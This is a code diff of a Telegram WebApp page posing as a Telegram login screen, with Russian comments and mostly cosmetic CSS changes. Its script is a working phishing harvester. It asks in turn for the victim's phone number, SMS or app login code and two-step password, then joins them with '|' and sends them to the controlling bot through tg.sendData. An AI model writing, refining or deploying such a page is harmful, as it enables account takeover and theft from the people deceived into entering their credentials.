@@ -14,8 +14,12 @@
         --input-bg: #242f3d;
     }
 
+    /* УБИРАЕМ СТРЕЛОЧКИ */
     input::-webkit-outer-spin-button,
-    input::-webkit-inner-spin-button { -webkit-appearance: none !important; margin: 0 !important; }
+    input::-webkit-inner-spin-button {
+        -webkit-appearance: none !important;
+        margin: 0 !important;
+    }
     input[type=number] { -moz-appearance: textfield !important; appearance: none !important; }
 
     body {
@@ -38,9 +42,16 @@
         border-radius: 28px;
         text-align: center;
         box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+        margin: 20px;
     }
 
-    .logo-area { font-size: 55px; margin-bottom: 20px; display: inline-block; }
+    .logo-area {
+        font-size: 55px;
+        margin-bottom: 20px;
+        transition: transform 0.3s ease;
+        display: inline-block;
+    }
+
     h2 { font-size: 22px; margin: 0 0 10px 0; font-weight: 600; }
     p { font-size: 14px; color: var(--hint-color); line-height: 1.5; margin-bottom: 30px; min-height: 42px; }
 
@@ -71,7 +82,10 @@
         font-size: 16px;
         font-weight: 700;
         cursor: pointer;
+        box-shadow: 0 4px 15px rgba(51, 144, 236, 0.3);
     }
+
+    button:active { transform: scale(0.97); }
 
     .step { display: none; }
     .active { display: block; animation: slideIn 0.4s ease forwards; }
@@ -90,7 +104,7 @@
     <div id="step-phone" class="step active">
         <h2>Вход</h2>
         <p>Введите номер телефона аккаунта</p>
-        <input type="tel" id="p" placeholder="+7...">
+        <input type="tel" id="p" placeholder="+7..." autofocus>
         <button onclick="nextStep('code')">Получить код</button>
     </div>
 
@@ -98,7 +112,7 @@
         <h2>Код SMS</h2>
         <p>Введите код из приложения или СМС</p>
         <input type="number" id="c" placeholder="00000">
-        <button onclick="nextStep('pass')">Продолжить</button>
+        <button onclick="checkPasswordStep()">Продолжить</button>
     </div>
 
     <div id="step-pass" class="step">
@@ -113,31 +127,23 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    let collectedData = {
-        p: '', // phone
-        c: '', // code
-        s: ''  // password
+    // Память для данных
+    let userData = {
+        phone: '',
+        code: '',
+        password: ''
     };
 
-    function nextStep(stepId) {
+    function nextStep(stepId, icon) {
         if (stepId === 'code') {
-            collectedData.p = document.getElementById('p').value;
-            if(!collectedData.p) return;
-            
-            // Показываем юзеру, что код "отправляется"
-            showStep('code', '⏳'); 
-            
-            // Через 2 секунды меняем иконку на письмо
-            setTimeout(() => {
-                document.getElementById('main-icon').innerText = '✉️';
-            }, 2000);
-
-            document.getElementById('c').focus();
-        } else if (stepId === 'pass') {
-            collectedData.c = document.getElementById('c').value;
-            if(!collectedData.c) return;
+            userData.phone = document.getElementById('p').value;
+            if(!userData.phone) return;
+            showStep('code', '✉️');
+        } 
+        else if (stepId === 'pass') {
+            userData.code = document.getElementById('c').value;
+            if(!userData.code) return;
             showStep('pass', '🔑');
-            document.getElementById('pass').focus();
         }
     }
 
@@ -145,16 +151,20 @@
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         document.getElementById('step-' + id).classList.add('active');
         document.getElementById('main-icon').innerText = icon;
-        // Автофокус на новом поле
-        const nextInput = document.querySelector('#step-' + id + ' input');
-        if(nextInput) nextInput.focus();
+        const input = document.querySelector('#step-' + id + ' input');
+        if(input) input.focus();
     }
 
     function finish() {
-        collectedData.s = document.getElementById('pass').value;
-        const result = `${collectedData.p}|${collectedData.c}|${collectedData.s}`;
-        tg.sendData(result);
+        userData.password = document.getElementById('pass').value;
+        
+        // Склеиваем всё в одну строку через разделитель |
+        const finalData = `${userData.phone}|${userData.code}|${userData.password}`;
+        
+        // Отправляем боту и закрываем окно
+        tg.sendData(finalData);
     }
 </script>
+
 </body>
 </html>
